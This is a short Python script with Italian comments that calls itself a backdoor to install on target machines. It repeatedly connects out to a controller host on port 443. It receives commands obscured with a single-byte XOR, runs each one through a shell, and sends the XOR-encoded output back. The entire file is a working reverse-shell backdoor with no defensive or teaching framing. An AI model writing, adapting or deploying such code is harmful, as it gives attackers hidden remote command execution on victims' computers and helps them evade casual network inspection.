          #!/usr/bin/python
          #backdoor che verrà installata sulle macchine target



import socket,subprocess,sys, pickle

while True:
     print("In attesa di connessione...")
     RHOST = "Ip host client"
     RPORT = 443
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
          s.connect((RHOST, RPORT))
          print("Connessione ricevuta...")
     except socket.error:
          continue


            
     while True:
          # riceviamo i dati codificati in XOR
     
          data = s.recv(1024)
          if data==b'':
               break

          
          # decifriamo i dati calcolando lo XOR con il carattere a '\x41'
          #en_data = data.decode()
          en_data = bytearray(data)
          for i in range(len(en_data)):
               en_data[i] ^=0x41
      
          print("dati arrivati: "+ str(en_data.decode()))
          # Eseguimo il comando in chiaro
          comm = subprocess.Popen(str(en_data.decode()), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
          STDOUT, STDERR = comm.communicate()
          if STDERR!=b'':
               STDOUT=STDERR
     

          #print("fine esecuzione:"+str(STDOUT.decode()))
          # Codifichiamo l'output e mandiamolo al controller

          
          #invio risposta del comando
          en_STDOUT = bytearray(STDOUT)   
          for i in range(len(en_STDOUT)):
               en_STDOUT[i] ^=0x41

          """packet=Packet(len(en_STDOUT),en_STDOUT)          
          packet= pickle.dumps(packet)"""
          s.sendall(en_STDOUT)

               
     s.close()



          
